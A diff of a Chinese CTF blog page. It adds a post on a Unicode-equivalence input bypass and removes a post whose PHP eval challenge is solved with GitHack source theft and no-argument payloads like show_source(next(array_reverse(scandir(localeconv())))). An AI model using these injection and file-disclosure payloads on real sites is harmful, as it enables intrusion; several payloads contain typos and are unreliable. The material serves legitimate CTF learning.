@@ -172,6 +172,72 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-unicode编码安全问题" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="article-date">
+  	<time datetime="2021-09-03T16:00:00.000Z" itemprop="datePublished">2021-09-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
+        unicode编码安全问题
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="unicode编码安全问题"><a href="#unicode编码安全问题" class="headerlink" title="unicode编码安全问题"></a>unicode编码安全问题</h1><p>当打开页面时，发现是一个购买的网页，然后输入id为1、2或3，然后输入price，发现显示是错误的商品，然后输入id为4，输入price为1337时，回显只能是一个字符</p>
+<p>而后我们再看源码，发现有一个重要的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;!--Ah,really important,seriously. --&gt;</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以想到使用unicode编码中的等价性来绕过只能输入一个字符的限制，所以我们可以在下面的网站搜索大于1337的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br><span class="line"></span><br><span class="line">搜索框输入：thousands</span><br></pre></td></tr></table></figure>
+
+<p>即可查到大于1000或等于1000的字符，然后取出它的utf-8的形式，将/u改为%即可</p>
+<p>unicode设计有许多安全的问题，详细请看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浅谈Unicode设计安全：https://xz.aliyun.com/t/5402</span><br><span class="line"></span><br><span class="line">unicode等价性浅谈：https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-各类模板注入" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1189,87 +1255,6 @@ while count==1:
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-搜索读取文件的php函数的应用" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/30/%E6%90%9C%E7%B4%A2%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84php%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/" class="article-date">
-  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/30/%E6%90%9C%E7%B4%A2%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84php%E5%87%BD%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/">
-        搜索读取文件的php函数的应用
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="搜索读取文件的php函数的应用"><a href="#搜索读取文件的php函数的应用" class="headerlink" title="搜索读取文件的php函数的应用"></a>搜索读取文件的php函数的应用</h1><p>打开页面，尝试各种泄露的可能，用GitHack.py发现是.git文件泄露，因此构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/</span><br></pre></td></tr></table></figure>
-<p>获取源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过看到eval()这个危险函数，我们可以构造一些恶意代码来读取，但是它过滤掉了一些伪协议和一些函数，但是我们可以先构造一个exp，在本地尝试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>来读取当前目录下的文件，如果“.”改为“\”,会读取系统下目录的文件，我们也可以使用localeconv()函数返回一包含本地数字及货币格式信息的数组，而构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(localeconv()));</span><br></pre></td></tr></table></figure>
-<p>可以看到第一个数组为“.”，因此，我们可以使用current()函数或pos()函数来默认读取返回数组中的当前单元，默认取第一个值。构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localconv())));</span><br></pre></td></tr></table></figure>
-<p>发现里面有flag.php，此时我们可以使用array_reverse()函数来颠倒数组中元素的顺序，而后用next()读取数组中的第二个元素，构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(scandir(localconv()))));</span><br></pre></td></tr></table></figure>
-<p>而后我们可以用readfile()函数或hightlight_file()函数或show_source()函数来读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(localeconv()))));</span><br></pre></td></tr></table></figure>
-<p>当然也可以用array_file()来调换键和值的位置，然后用array_rand()读取键值，不断刷新不断随机返回</p>
-<p>同时我们也可以使用PHPSESSID来解题，因为flag.php文件里的字符是由PHPSESSID来支持的，但是在使用session前要通过session_start()来告诉php我要使用session，因为php默认不主动使用session，而session_id()可以获取当前的session id</p>
-<p>使用方法，我们要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(session_id(session_start());</span><br></pre></td></tr></table></figure>
-<p>可返回flag.php</p>
-<p>而后和上面一样，用readfile()函数或hightlight_file()函数或show_source()函数来读取文件，要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start());</span><br></pre></td></tr></table></figure>
-<p>读取flag.php的内容</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
